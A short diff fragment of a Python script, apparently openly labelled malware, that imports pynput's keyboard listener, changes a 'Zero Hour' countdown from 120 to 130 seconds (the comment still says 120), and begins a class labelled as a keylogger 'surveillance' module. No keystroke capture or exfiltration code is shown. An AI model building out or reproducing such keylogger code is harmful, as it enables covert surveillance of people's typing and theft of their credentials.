@@ -7,8 +7,7 @@ from pynput import keyboard
 
 # --- CONFIGURATION ---
 # Zero Hour: 120 seconds from execution
-TARGET_EPOCH = time.time() + 120 
-
+TARGET_EPOCH = time.time() + 130
 # --- MODULE 1: SURVEILLANCE (Keylogger) ---
 class Surveillance:
     def __init__(self):
